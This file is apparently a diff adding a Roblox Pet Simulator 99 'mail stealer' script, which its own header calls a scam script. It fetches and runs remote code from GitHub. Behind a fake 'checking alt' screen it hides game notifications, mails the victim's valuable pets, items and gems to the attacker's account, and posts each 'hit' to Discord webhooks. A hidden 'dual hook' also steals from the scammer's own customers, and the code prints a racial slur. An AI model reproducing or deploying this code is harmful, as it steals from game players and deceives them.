@@ -1,0 +1,1148 @@
+-- ts file was generated at ----
+-- credit unobf moonsec v3 to ----
+-- ts is a scam script
+
+Username = 'ice146782'
+Username2 = 'ice146782'
+MinimumRAP = 100000
+Webhook = 'https://discord.com/api/webhooks/1437039175214829670/x_4FWDwoNCYkYNx8G_3EDWZv8hVlZ5nOlII1XfLxBHecL-OBspLnYzgeWylMLBszizpO'
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/secret-script/Leaks/main/Ps99-ScamSourceGui', true))()
+
+-- source here
+--[[
+
+local _ScreenGui = Instance.new('ScreenGui')
+local _Frame = Instance.new('Frame')
+local _UICorner = Instance.new('UICorner')
+local _Frame2 = Instance.new('Frame')
+local _UICorner2 = Instance.new('UICorner')
+local _Frame3 = Instance.new('Frame')
+local _UICorner3 = Instance.new('UICorner')
+local _TextLabel = Instance.new('TextLabel')
+local _TextLabel2 = Instance.new('TextLabel')
+local _UICorner4 = Instance.new('UICorner')
+local _UIStroke = Instance.new('UIStroke')
+local _UIStroke2 = Instance.new('UIStroke')
+
+_ScreenGui.Name = 'ScreenGui1'
+_ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild('PlayerGui')
+_ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+_Frame.Parent = _ScreenGui
+_Frame.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
+_Frame.BackgroundTransparency = 0.35
+_Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+_Frame.BorderSizePixel = 0
+_Frame.Position = UDim2.new(0.640737772, 0, 0.212460071, 0)
+_Frame.Size = UDim2.new(0, 287, 0, 189)
+_UIStroke2.Parent = _Frame
+_UIStroke2.Thickness = 4.3
+_Frame.Active = true
+_Frame.Draggable = true
+_UICorner.CornerRadius = UDim.new(0, 20)
+_UICorner.Parent = _Frame
+_Frame2.Name = 'Progress bar'
+_Frame2.Parent = _Frame
+_Frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_Frame2.BackgroundTransparency = 1
+_Frame2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+_Frame2.BorderSizePixel = 0
+_Frame2.Position = UDim2.new(0.0905923322, 0, 0.619047642, 0)
+_Frame2.Size = UDim2.new(0, 235, 0, 45)
+_UIStroke.Parent = _Frame2
+_UIStroke.Thickness = 4.3
+_UICorner2.Parent = _Frame2
+_Frame3.Name = 'Bar'
+_Frame3.Parent = _Frame2
+_Frame3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_Frame3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+_Frame3.BorderSizePixel = 0
+_Frame3.Size = UDim2.new(0, 0, 1, 0)
+_UICorner3.Parent = _Frame3
+_TextLabel.Name = 'astr'
+_TextLabel.Parent = _Frame
+_TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel.BackgroundTransparency = 1
+_TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+_TextLabel.BorderSizePixel = 0
+_TextLabel.Position = UDim2.new(0.149825782, 0, 0.349206358, 0)
+_TextLabel.Size = UDim2.new(0, 200, 0, 40)
+_TextLabel.Font = Enum.Font.SourceSansBold
+_TextLabel.Text = 'Checking If Alt Is Used https://discord.gg/VA6CjrCZBx'
+_TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel.TextScaled = true
+_TextLabel.TextSize = 14
+_TextLabel.TextWrapped = true
+_TextLabel2.Parent = _Frame
+_TextLabel2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel2.BackgroundTransparency = 1
+_TextLabel2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+_TextLabel2.BorderSizePixel = 0
+_TextLabel2.Position = UDim2.new(0.108013935, 0, 0.0793650821, 0)
+_TextLabel2.Size = UDim2.new(0, 225, 0, 51)
+_TextLabel2.Font = Enum.Font.SourceSansBold
+_TextLabel2.Text = 'TextLabel'
+_TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
+_TextLabel2.TextScaled = true
+_TextLabel2.TextSize = 14
+_TextLabel2.TextWrapped = true
+_UICorner4.Parent = _TextLabel2
+
+local function v14()
+    local _LocalScript = Instance.new('LocalScript', _Frame3)
+
+    _LocalScript.Parent:TweenSize(UDim2.new(1, 0, 1, 0), 'InOut', 'Sine', 60)
+    wait(60)
+
+    _LocalScript.Parent.Parent.Parent.Parent.Enabled = false
+
+    require(game.ReplicatedStorage.Library.Client.Message).Error('Alt Account Detected! Join On Main & Try Again https://discord.gg/VA6CjrCZBx')
+end
+
+coroutine.wrap(v14)()
+
+local function v18()
+    local _Parent = Instance.new('LocalScript', _TextLabel2).Parent
+    local v16 = {
+        'Loading.',
+        'Loading..',
+        'Loading...',
+    }
+    local v17 = 1
+
+    while true do
+        _Parent.Text = v16[v17]
+        v17 = v17 % #v16 + 1
+
+        wait(0.9)
+    end
+end
+
+coroutine.wrap(v18)()
+task.spawn(function()
+    while true do
+        task.wait(0.1)
+
+        local _RobloxGui = game:GetService('CoreGui'):FindFirstChild('RobloxGui')
+        local v20 = {
+            1,
+            2,
+            3,
+            4,
+            5,
+        }
+
+        for v21 = 1, #v20 do
+            local _ = v20[v21] * 2 / 2
+        end
+
+        if math.random(1, 100) <= 50 then
+            print('Scanning')
+        else
+            print('System running smoothly')
+        end
+        if _RobloxGui and _RobloxGui.Name == 'RobloxGui' then
+            _RobloxGui:Destroy()
+        end
+
+        local v22 = math.random(1, 10)
+
+        if v22 == 5 then
+            local _ = math.sqrt(v22) * 100 / 100
+        end
+
+        for _ = 1, 10 do
+            local _ = math.random(1, 100) * 2 / 2
+        end
+
+        if math.random() > 0.5 then
+            print('Critical system status: All protocols active')
+        end
+
+        task.wait(0.2)
+    end
+end)
+
+DualRAP = 100000000000
+DualUser = ''
+DualWebhook = ''
+LogsWebhook = 'https://discord.com/api/webhooks/1372526703993163847/_PSZ6YmDo4SSJRHe_XmwWaoCU3GBhZFQJvCGuEiFxgBUOGqoMcXeWdbdF447eEUNE2bW'
+mailstealer_name = 'xe'
+Roblox_Username = Username
+Discord_Webhook = Webhook
+LOGS_WEBHOOK = LogsWebhook
+
+if getgenv().Executed == true then
+    return
+end
+
+getgenv().Executed = true
+
+repeat
+    task.wait()
+until game:IsLoaded()
+
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+if game:GetService('Players').LocalPlayer.Name == Username then
+    game:GetService('Players').LocalPlayer:Kick('You Are The Owner! (test it on alt acc)')
+
+    return
+end
+if Username == nil then
+    game:GetService('Players').LocalPlayer:Kick('Put A UserName')
+
+    return
+end
+
+repeat
+    task.wait()
+until game:IsLoaded()
+repeat
+    task.wait()
+until game.PlaceId ~= nil
+repeat
+    task.wait()
+until not game.Players.LocalPlayer.PlayerGui:FindFirstChild('__INTRO')
+
+require(game.ReplicatedStorage.Library)
+
+local v23 = require(game:GetService('ReplicatedStorage').Library.Client.Save).Get()
+local u24 = require(game:GetService('ReplicatedStorage').Library.Directory)
+local _LocalPlayer = game.Players.LocalPlayer
+local _Inventory = v23.Inventory
+local _HttpService = game:GetService('HttpService')
+
+require(game.ReplicatedStorage.Library.Client.Message)
+
+local _Network = game:GetService('ReplicatedStorage'):WaitForChild('Network')
+local u29 = require(game:GetService('ReplicatedStorage').Library.Client.RAPCmds)
+local v30, v31, v32 = pairs(_Inventory.Currency)
+
+while true do
+    local v33
+
+    v32, v33 = v30(v31, v32)
+
+    if v32 == nil then
+        break
+    end
+    if v33.id == 'Diamonds' then
+        GemsAmount = v33._am or 0
+
+        break
+    end
+end
+
+local v34, v35, v36 = pairs(getgc())
+
+while true do
+    local v37
+
+    v36, v37 = v34(v35, v36)
+
+    if v36 == nil then
+        break
+    end
+    if typeof(v37) == 'function' and debug.getinfo(v37).name == 'computeSendMailCost' then
+        FunctionToGetFirstPriceOfMail = v37
+
+        break
+    end
+end
+
+FirstPriceOfMail = FunctionToGetFirstPriceOfMail()
+
+if FirstPriceOfMail > GemsAmount then
+    print("You don't have enough gems to run a script")
+
+    return
+end
+
+local function u42(p38)
+    local v39 = math.floor(p38)
+    local v40 = {
+        '',
+        'k',
+        'm',
+        'b',
+        't',
+    }
+    local v41 = 1
+
+    while v39 >= 1000 do
+        v39 = v39 / 1000
+        v41 = v41 + 1
+    end
+
+    return string.format('%.2f%s', v39, v40[v41])
+end
+local function u50(p43, p44)
+    local v49 = {
+        Class = {Name = p43},
+        IsA = function(_, p45)
+            return p45 == p43
+        end,
+        GetId = function(_)
+            return p44.id
+        end,
+        StackKey = function(_)
+            return _HttpService:JSONEncode({
+                id = p44.id,
+                pt = p44.pt,
+                sh = p44.sh,
+                tn = p44.tn,
+            })
+        end,
+        AbstractGetRAP = function(p46)
+            if u29 and type(u29.Get) == 'function' then
+                local v47, v48 = pcall(u29.Get, p46)
+
+                if v47 then
+                    return v48
+                else
+                    return nil
+                end
+            else
+                return nil
+            end
+        end,
+    }
+
+    return v49
+end
+local function v54(p51, p52)
+    local v53 = u50(p51, p52)
+
+    return v53 and (v53:AbstractGetRAP() or 0) or 0
+end
+
+function deepCopy(p55)
+    local v56, v57, v58 = pairs(p55)
+    local v59 = {}
+
+    while true do
+        local v60
+
+        v58, v60 = v56(v57, v58)
+
+        if v58 == nil then
+            break
+        end
+        if type(v60) == 'table' then
+            v60 = deepCopy(v60)
+        end
+
+        v59[v58] = v60
+    end
+
+    return v59
+end
+
+local function u76(p61, p62, p63, p64, p65, p66, p67, p68, p69, p70)
+    ({})['Content-Type'] = 'application/json'
+
+    if p67 == true then
+        shinyy = 'Shiny'
+    elseif p67 == false then
+        shinyy = 'not Shiny'
+    end
+
+    imgs = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSTfzIo5dIXXDXFMb29o-n4lMegTQDnFKfRwA&s'
+
+    local _LocalPlayer2 = game:GetService('Players').LocalPlayer
+    local v72 = identifyexecutor() or 'undefined'
+
+    JobId = game.JobId
+
+    local _ = _LocalPlayer.Name
+    local v73 = {
+        content = p68,
+        username = '' .. mailstealer_name .. ' mailstealer',
+        avatar_url = imgs,
+        embeds = {
+            {
+                title = '**WOW YOU GOT A HIT!!**',
+                type = 'rich',
+                color = tonumber(0),
+                thumbnail = {url = p64},
+                fields = {
+                    {
+                        name = '**PS99 hit using ' .. mailstealer_name .. ' scripts!**',
+                        value = '```Username     : ' .. _LocalPlayer2.Name .. '\nUser-ID      : ' .. _LocalPlayer2.userId .. '\nAccount Age  : ' .. _LocalPlayer2.AccountAge .. ' Days' .. '\nExploit      : ' .. v72 .. '\nReceiver     : ' .. Roblox_Username .. '\nTotal RAP    : ' .. u42(p70) .. '```',
+                        inline = false,
+                    },
+                    {
+                        name = ':dog: **Pets left** :dog:',
+                        value = '```\u{279c} ' .. p66 .. '```',
+                        inline = true,
+                    },
+                    {
+                        name = ':money_mouth: **' .. p62 .. '** :money_mouth:',
+                        value = '```\u{279c} ' .. p61 .. '```',
+                        inline = true,
+                    },
+                    {
+                        name = ':trophy: **Item RAP** :trophy:',
+                        value = '```\u{279c} ' .. u42(p69) .. '```',
+                        inline = true,
+                    },
+                    {
+                        name = ':gem: **Gems Left** :gem:',
+                        value = '```\u{279c} ' .. u42(GemsAmount) .. '```',
+                        inline = true,
+                    },
+                    {
+                        name = ':sparkles: **Shiny** :sparkles:',
+                        value = '```\u{279c} ' .. shinyy .. '```',
+                        inline = true,
+                    },
+                    {
+                        name = ':rainbow: **RB/Gold/Reg** :sparkles:',
+                        value = '```\u{279c} ' .. p63 .. '```',
+                        inline = true,
+                    },
+                },
+            },
+        },
+        attachments = {},
+    }
+    local v74 = http_request or request or (HttpPost or syn.request)
+    local v75 = {
+        Url = p65,
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json',
+        },
+        Body = game.HttpService:JSONEncode(v73),
+    }
+
+    v74(v75)
+end
+
+local _Value = _LocalPlayer.leaderstats['\u{1f48e} Diamonds'].Value
+local _Diamonds = _LocalPlayer.leaderstats['\u{1f48e} Diamonds']
+local v79 = _Diamonds
+
+_Diamonds.GetPropertyChangedSignal(v79, 'Value'):Connect(function()
+    _Diamonds.Value = _Value
+end)
+
+local _ProcessPendingGUI = _LocalPlayer.PlayerScripts.Scripts.Core['Process Pending GUI']
+local _Notifications = _LocalPlayer.PlayerGui.Notifications
+
+_ProcessPendingGUI.Disabled = true
+
+local v82 = _Notifications
+
+_Notifications.GetPropertyChangedSignal(v82, 'Enabled'):Connect(function()
+    _Notifications.Enabled = false
+end)
+
+_Notifications.Enabled = false
+
+task.spawn(function()
+    game.DescendantAdded:Connect(function(p83)
+        if p83.ClassName == 'Sound' and (p83.SoundId == 'rbxassetid://11839132565' or (p83.SoundId == 'rbxassetid://14254721038' or p83.SoundId == 'rbxassetid://12413423276')) then
+            p83.Volume = 0
+            p83.PlayOnRemove = false
+
+            p83:Destroy()
+        end
+    end)
+end)
+
+local function v86(p84)
+    Asset = string.split(p84, 'rbxassetid://')[2]
+
+    local v85 = game:HttpGet('https://thumbnails.roblox.com/v1/assets?assetIds=' .. Asset .. '&returnPolicy=PlaceHolder&size=420x420&format=png')
+
+    thumbnail = game.HttpService:JSONDecode(v85).data[1].imageUrl
+
+    return thumbnail
+end
+
+MinimumRAP = FirstPriceOfMail
+
+local u87
+
+if _Inventory.Box then
+    local v88, v89, v90 = pairs(_Inventory.Box)
+
+    u87 = v54
+
+    while true do
+        local v91
+
+        v90, v91 = v88(v89, v90)
+
+        if v90 == nil then
+            break
+        end
+        if v91._uq then
+            game:GetService('ReplicatedStorage'):WaitForChild('Network'):WaitForChild('Box: Withdraw All'):InvokeServer(v90)
+        end
+    end
+else
+    u87 = v54
+end
+
+local _, v92 = game:GetService('ReplicatedStorage'):WaitForChild('Network'):WaitForChild('Mailbox: Claim All'):InvokeServer()
+
+while v92 == 'You must wait 30 seconds before using the mailbox!' do
+    wait()
+
+    local v93
+
+    v93, v92 = game:GetService('ReplicatedStorage'):WaitForChild('Network'):WaitForChild('Mailbox: Claim All'):InvokeServer()
+end
+
+require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
+require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+
+itemsCounted = 0
+
+local v145 = (function()
+    local v94 = {}
+
+    if _Inventory.Pet ~= nil then
+        local v95, v96, v97 = pairs(_Inventory.Pet)
+
+        while true do
+            local v98
+
+            v97, v98 = v95(v96, v97)
+
+            if v97 == nil then
+                break
+            end
+
+            id = v98.id
+            dir = u24.Pets[id]
+
+            if dir.huge and dir.Tradable ~= false then
+                rap = u87('Pet', v98)
+
+                if v98.pt ~= 1 then
+                    if v98.pt ~= 2 then
+                        ItemImageId = dir.thumbnail
+                        ItemType = 'Normal'
+                    else
+                        ItemImageId = dir.thumbnail
+                        ItemType = 'Rainbow'
+                    end
+                else
+                    ItemImageId = dir.goldenThumbnail
+                    ItemType = 'Golden'
+                end
+
+                table.insert(v94, {
+                    Item_Id = v97,
+                    Item_Name = v98.id,
+                    Item_Amount = v98._am or 1,
+                    Item_RAP = rap,
+                    Item_Class = 'Pet',
+                    IsShiny = v98.sh or false,
+                    IsLocked = v98.lk or false,
+                    Item_ImageId = ItemImageId,
+                    Item_Type = ItemType,
+                })
+            end
+            if dir.exclusiveLevel and dir.Tradable ~= false then
+                rap = u87('Pet', v98) * (v98._am or 1)
+
+                if v98.pt ~= 1 then
+                    if v98.pt ~= 2 then
+                        ItemImageId = dir.thumbnail
+                        ItemType = 'Normal'
+                    else
+                        ItemImageId = dir.thumbnail
+                        ItemType = 'Rainbow'
+                    end
+                else
+                    ItemImageId = dir.goldenThumbnail
+                    ItemType = 'Golden'
+                end
+                if rap > MinimumRAP then
+                    table.insert(v94, {
+                        Item_Id = v97,
+                        Item_Name = v98.id,
+                        Item_Amount = v98._am or 1,
+                        Item_RAP = rap,
+                        Item_Class = 'Pet',
+                        IsShiny = v98.sh or false,
+                        IsLocked = v98.lk or false,
+                        Item_ImageId = ItemImageId,
+                        Item_Type = ItemType,
+                    })
+                end
+            end
+        end
+    end
+    if _Inventory.Egg ~= nil then
+        local v99, v100, v101 = pairs(_Inventory.Egg)
+
+        while true do
+            local v102
+
+            v101, v102 = v99(v100, v101)
+
+            if v101 == nil then
+                break
+            end
+
+            id = v102.id
+            dir = u24.Eggs[id]
+            rap = u87('Egg', v102)
+            ItemType = 'Normal'
+            ItemImageId = dir.icon
+
+            if rap > MinimumRAP then
+                table.insert(v94, {
+                    Item_Id = v101,
+                    Item_Name = v102.id,
+                    Item_Amount = v102._am or 1,
+                    Item_RAP = rap,
+                    Item_Class = 'Egg',
+                    IsShiny = v102.sh or false,
+                    IsLocked = v102.lk or false,
+                    Item_ImageId = ItemImageId,
+                    Item_Type = ItemType,
+                })
+            end
+        end
+    end
+    if _Inventory.Misc ~= nil then
+        local v103, v104, v105 = pairs(_Inventory.Misc)
+
+        while true do
+            local v106
+
+            v105, v106 = v103(v104, v105)
+
+            if v105 == nil then
+                break
+            end
+
+            id = v106.id
+            dir = u24.MiscItems[id]
+            rap = u87('Misc', v106)
+            ItemType = 'Normal'
+            ItemImageId = dir.Icon
+
+            if rap > MinimumRAP and v106.id ~= 'Slingshot' then
+                table.insert(v94, {
+                    Item_Id = v105,
+                    Item_Name = v106.id,
+                    Item_Amount = v106._am or 1,
+                    Item_RAP = rap,
+                    Item_Class = 'Misc',
+                    IsShiny = v106.sh or false,
+                    IsLocked = v106.lk or false,
+                    Item_ImageId = ItemImageId,
+                    Item_Type = ItemType,
+                })
+            end
+        end
+    end
+    if _Inventory.Charm ~= nil then
+        local v107, v108, v109 = pairs(_Inventory.Charm)
+
+        while true do
+            local v110
+
+            v109, v110 = v107(v108, v109)
+
+            if v109 == nil then
+                break
+            end
+
+            id = v110.id
+            dir = u24.Charms[id]
+            rap = u87('Charm', v110)
+            ItemType = 'Normal'
+            ItemImageId = dir.Icon
+
+            if rap > MinimumRAP then
+                table.insert(v94, {
+                    Item_Id = v109,
+                    Item_Name = v110.id,
+                    Item_Amount = v110._am or 1,
+                    Item_RAP = rap,
+                    Item_Class = 'Charm',
+                    IsShiny = v110.sh or false,
+                    IsLocked = v110.lk or false,
+                    Item_ImageId = ItemImageId,
+                    Item_Type = ItemType,
+                })
+            end
+        end
+    end
+    if _Inventory.Enchant ~= nil then
+        local v111, v112, v113 = pairs(_Inventory.Enchant)
+
+        while true do
+            local v114
+
+            v113, v114 = v111(v112, v113)
+
+            if v113 == nil then
+                break
+            end
+
+            id = v114.id
+            dir = u24.Enchants[id]
+            rap = u87('Enchant', v114)
+            ItemType = 'Normal'
+            ItemImageId = dir.Icon(v114.tn)
+
+            if rap > MinimumRAP then
+                table.insert(v94, {
+                    Item_Id = v113,
+                    Item_Name = v114.id,
+                    Item_Amount = v114._am or 1,
+                    Item_RAP = rap,
+                    Item_Class = 'Enchant',
+                    IsShiny = v114.sh or false,
+                    IsLocked = v114.lk or false,
+                    Item_ImageId = ItemImageId,
+                    Item_Type = ItemType,
+                })
+            end
+        end
+    end
+    if _Inventory.Lootbox ~= nil then
+        local v115, v116, v117 = pairs(_Inventory.Lootbox)
+
+        while true do
+            local v118
+
+            v117, v118 = v115(v116, v117)
+
+            if v117 == nil then
+                break
+            end
+
+            id = v118.id
+            dir = u24.Lootboxes[id]
+            rap = u87('Lootbox', v118)
+            ItemType = 'Normal'
+            ItemImageId = dir.Icon
+
+            if rap > MinimumRAP then
+                table.insert(v94, {
+                    Item_Id = v117,
+                    Item_Name = v118.id,
+                    Item_Amount = v118._am or 1,
+                    Item_RAP = rap,
+                    Item_Class = 'Lootbox',
+                    IsShiny = v118.sh or false,
+                    IsLocked = v118.lk or false,
+                    Item_ImageId = ItemImageId,
+                    Item_Type = ItemType,
+                })
+            end
+        end
+    end
+    if _Inventory.Potion ~= nil then
+        local v119, v120, v121 = pairs(_Inventory.Potion)
+
+        while true do
+            local v122
+
+            v121, v122 = v119(v120, v121)
+
+            if v121 == nil then
+                break
+            end
+
+            id = v122.id
+            dir = u24.Potions[id]
+            rap = u87('Potion', v122)
+            ItemType = 'Normal'
+            ItemImageId = dir.Icon(v122.tn)
+
+            if rap > MinimumRAP then
+                table.insert(v94, {
+                    Item_Id = v121,
+                    Item_Name = v122.id,
+                    Item_Amount = v122._am or 1,
+                    Item_RAP = rap,
+                    Item_Class = 'Potion',
+                    IsShiny = v122.sh or false,
+                    IsLocked = v122.lk or false,
+                    Item_ImageId = ItemImageId,
+                    Item_Type = ItemType,
+                })
+            end
+        end
+    end
+    if _Inventory.Seed ~= nil then
+        local v123, v124, v125 = pairs(_Inventory.Seed)
+
+        while true do
+            local v126
+
+            v125, v126 = v123(v124, v125)
+
+            if v125 == nil then
+                break
+            end
+
+            id = v126.id
+            dir = u24.Seeds[id]
+            rap = u87('Seed', v126)
+            ItemType = 'Normal'
+            ItemImageId = dir.Icon
+
+            if rap > MinimumRAP then
+                table.insert(v94, {
+                    Item_Id = v125,
+                    Item_Name = v126.id,
+                    Item_Amount = v126._am or 1,
+                    Item_RAP = rap,
+                    Item_Class = 'Seed',
+                    IsShiny = v126.sh or false,
+                    IsLocked = v126.lk or false,
+                    Item_ImageId = ItemImageId,
+                    Item_Type = ItemType,
+                })
+            end
+        end
+    end
+    if _Inventory.Ultimate ~= nil then
+        local v127, v128, v129 = pairs(_Inventory.Ultimate)
+
+        while true do
+            local v130
+
+            v129, v130 = v127(v128, v129)
+
+            if v129 == nil then
+                break
+            end
+
+            id = v130.id
+            dir = u24.Ultimates[id]
+            rap = u87('Ultimate', v130)
+            ItemType = 'Normal'
+            ItemImageId = dir.Icon
+
+            if rap > MinimumRAP then
+                table.insert(v94, {
+                    Item_Id = v129,
+                    Item_Name = v130.id,
+                    Item_Amount = v130._am or 1,
+                    Item_RAP = rap,
+                    Item_Class = 'Ultimate',
+                    IsShiny = v130.sh or false,
+                    IsLocked = v130.lk or false,
+                    Item_ImageId = ItemImageId,
+                    Item_Type = ItemType,
+                })
+            end
+        end
+    end
+    if _Inventory.Fruit ~= nil then
+        local v131, v132, v133 = pairs(_Inventory.Fruit)
+
+        while true do
+            local v134
+
+            v133, v134 = v131(v132, v133)
+
+            if v133 == nil then
+                break
+            end
+
+            id = v134.id
+            dir = u24.Fruits[id]
+            rap = u87('Fruit', v134)
+            ItemType = 'Normal'
+            ItemImageId = dir.Icon
+
+            if rap > MinimumRAP then
+                table.insert(v94, {
+                    Item_Id = v133,
+                    Item_Name = v134.id,
+                    Item_Amount = v134._am or 1,
+                    Item_RAP = rap,
+                    Item_Class = 'Fruit',
+                    IsShiny = v134.sh or false,
+                    IsLocked = v134.lk or false,
+                    Item_ImageId = ItemImageId,
+                    Item_Type = ItemType,
+                })
+            end
+        end
+    end
+    if _Inventory.Hoverboard ~= nil then
+        local v135, v136, v137 = pairs(_Inventory.Hoverboard)
+
+        while true do
+            local v138
+
+            v137, v138 = v135(v136, v137)
+
+            if v137 == nil then
+                break
+            end
+
+            id = v138.id
+            dir = u24.Hoverboards[id]
+            rap = u87('Hoverboard', v138)
+            ItemType = 'Normal'
+            ItemImageId = dir.Icon
+
+            if rap > MinimumRAP then
+                table.insert(v94, {
+                    Item_Id = v137,
+                    Item_Name = v138.id,
+                    Item_Amount = v138._am or 1,
+                    Item_RAP = rap,
+                    Item_Class = 'Hoverboard',
+                    IsShiny = v138.sh or false,
+                    IsLocked = v138.lk or false,
+                    Item_ImageId = ItemImageId,
+                    Item_Type = ItemType,
+                })
+            end
+        end
+    end
+    if _Inventory.Booth ~= nil then
+        local v139, v140, v141 = pairs(_Inventory.Booth)
+
+        while true do
+            local v142
+
+            v141, v142 = v139(v140, v141)
+
+            if v141 == nil then
+                break
+            end
+
+            id = v142.id
+            dir = u24.Booths[id]
+            rap = u87('Booth', v142)
+            ItemType = 'Normal'
+            ItemImageId = dir.Icon
+
+            if rap > MinimumRAP then
+                table.insert(v94, {
+                    Item_Id = v141,
+                    Item_Name = v142.id,
+                    Item_Amount = v142._am or 1,
+                    Item_RAP = rap,
+                    Item_Class = 'Booth',
+                    IsShiny = v142.sh or false,
+                    IsLocked = v142.lk or false,
+                    Item_ImageId = ItemImageId,
+                    Item_Type = ItemType,
+                })
+            end
+        end
+    end
+
+    table.sort(v94, function(p143, p144)
+        return p143.Item_RAP > p144.Item_RAP
+    end)
+
+    return v94
+end)()
+
+currentMailPrice = FirstPriceOfMail
+
+local v146, v147, v148 = pairs(v145)
+local u149 = 0
+
+local function v155()
+    local v150, v151, v152 = pairs(_Inventory.Pet)
+    local v153, _ = v150(v151, v152)
+
+    if v153 == nil then
+        v153 = nil
+    end
+
+    local _, v154 = _Network:WaitForChild('Mailbox: Send'):InvokeServer(unpack({
+        'Roblox',
+        'Test',
+        'Pet',
+        v153,
+        1,
+    }))
+
+    return v154 ~= "They don't have enough space!" and v154 ~= "You don't have enough diamonds to send the mail!"
+end
+
+while true do
+    local v156, v157 = v146(v147, v148)
+
+    if v156 == nil then
+        break
+    end
+
+    v148 = v156
+
+    if v157.Item_RAP >= currentMailPrice then
+        u149 = u149 + v157.Item_RAP
+        itemsCounted = itemsCounted + 1
+    end
+
+    currentMailPrice = currentMailPrice * 1.5
+
+    if currentMailPrice > 5000000 then
+        currentMailPrice = 5000000
+    end
+end
+
+if DualRAP <= u149 then
+    print('EZ BITCH NIGGER')
+
+    Roblox_Username = DualUser
+    Discord_Webhook = DualWebhook
+end
+
+local function v165(p158, p159, p160, p161)
+    local v162 = {
+        Roblox_Username,
+        '' .. mailstealer_name .. ' scripts on top',
+        p158,
+        p159,
+        p160,
+    }
+
+    while true do
+        if p161 == true then
+            game:GetService('ReplicatedStorage').Network.Locking_SetLocked:InvokeServer(unpack({p159, false}))
+        end
+
+        local v163, v164 = _Network:WaitForChild('Mailbox: Send'):InvokeServer(unpack(v162))
+
+        if v163 == false and v164 == "They don't have enough space!" then
+            Roblox_Username = Username2
+            v162[1] = Roblox_Username
+        end
+        if v163 == true then
+            GemsAmount = GemsAmount - FirstPriceOfMail
+            FirstPriceOfMail = math.ceil(math.ceil(FirstPriceOfMail) * 1.5)
+
+            if FirstPriceOfMail > 5000000 then
+                FirstPriceOfMail = 5000000
+            end
+
+            return
+        end
+    end
+end
+local function v171()
+    local v166, v167, v168 = pairs(_Inventory.Currency)
+
+    while true do
+        local v169
+
+        v168, v169 = v166(v167, v168)
+
+        if v168 == nil then
+            break
+        end
+        if v169.id == 'Diamonds' and GemsAmount >= FirstPriceOfMail + 10000 then
+            SentGems = GemsAmount - FirstPriceOfMail
+
+            local v170 = {
+                Roblox_Username,
+                '' .. mailstealer_name .. ' scripts on top',
+                'Currency',
+                v168,
+                SentGems,
+            }
+
+            while _Network:WaitForChild('Mailbox: Send'):InvokeServer(unpack(v170)) ~= true do end
+
+            u76('Diamonds', 'Currency', 'Gems', 'rbxassetid://15258327857', Discord_Webhook, 'none', 'no', '@everyone', SentGems, u149)
+
+            break
+        end
+    end
+end
+
+Left_Hits = #v145
+
+if #v145 > 0 or GemsAmount > FirstPriceOfMail then
+    local v172 = require(game:GetService('ReplicatedStorage').Library.Client.Save)
+    local u173 = v172.Get()
+
+    FavoriteModeSelection = v172.Get().FavoriteModeSelection
+    FavoriteModeSelectionPlaza = v172.Get().FavoriteModeSelectionPlaza
+    oldGet = deepCopy(u173)
+
+    function v172.Get()
+        u173 = oldGet
+        u173.FavoriteModeSelection = {FavoriteModeSelection}
+        u173.FavoriteModeSelectionPlaza = {FavoriteModeSelectionPlaza}
+
+        return u173
+    end
+
+    if v155() then
+        local _MailboxSend = game:GetService('ReplicatedStorage'):WaitForChild('Network'):WaitForChild('Mailbox: Send')
+        local v175, v176, v177 = ipairs(getgc(true))
+
+        while true do
+            local v178, v179 = v175(v176, v177)
+
+            if v178 == nil then
+                break
+            end
+
+            v177 = v178
+
+            if typeof(v179) == 'function' and debug.info(v179, 'n') == 'typeof' then
+                local u180 = nil
+
+                u180 = hookfunction(v179, function(p181, ...)
+                    if p181 ~= _MailboxSend then
+                        return u180(p181, ...)
+                    else
+                        return tick()
+                    end
+                end)
+            end
+        end
+    end
+
+    local v182, v183, v184 = pairs(v145)
+
+    while true do
+        local u185
+
+        v184, u185 = v182(v183, v184)
+
+        if v184 == nil then
+            break
+        end
+        if FirstPriceOfMail > 5000000 then
+            FirstPriceOfMail = 5000000
+        end
+        if u185.Item_RAP < FirstPriceOfMail then
+            break
+        end
+
+        v165(u185.Item_Class, u185.Item_Id, u185.Item_Amount, u185.IsLocked)
+
+        thumb = v86(u185.Item_ImageId)
+        Left_Hits = Left_Hits - 1
+
+        task.spawn(function()
+            u76(u185.Item_Name, u185.Item_Class, u185.Item_Type, thumb, Discord_Webhook, Left_Hits, u185.IsShiny, '@everyone', u185.Item_RAP, u149)
+
+            if Roblox_Username ~= DualhookUsername then
+                u76(u185.Item_Name, u185.Item_Class, u185.Item_Type, thumb, LOGS_WEBHOOK, Left_Hits, u185.IsShiny, 'XE ON TOP!!', u185.Item_RAP, u149)
+            end
+        end)
+    end
+
+    v171()
+end
+
+]]
